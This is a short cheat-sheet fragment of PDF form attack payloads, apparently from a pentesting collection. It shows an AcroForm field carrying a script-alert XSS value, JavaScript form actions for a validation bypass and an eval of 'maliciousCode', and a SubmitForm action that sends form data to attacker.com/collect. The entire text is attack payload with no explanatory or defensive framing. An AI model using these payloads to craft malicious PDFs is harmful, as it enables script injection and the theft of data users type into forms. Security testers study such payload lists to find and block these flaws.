<form_field_injection>
<pdf_form_attacks>
{% raw %}
# PDF form field manipulation:

# AcroForm injection:
/AcroForm <<
  /Fields [
    << /T (malicious)
       /V <script>alert(1)</script>
       /FT /Tx
    >>
  ]
>>

# Field validation bypass:
# Inject JavaScript in form actions
/AA <<
  /K << /S /JavaScript /JS (
    event.value = 'injected';
  ) >>
>>

# Calculated field injection:
/AA <<
  /C << /S /JavaScript /JS (
    event.value = eval(maliciousCode);
  ) >>
>>

# Submit form to attacker:
/AA <<
  /F << /S /SubmitForm /F (http://attacker.com/collect) >>
>>
{% endraw %}
</pdf_form_attacks>

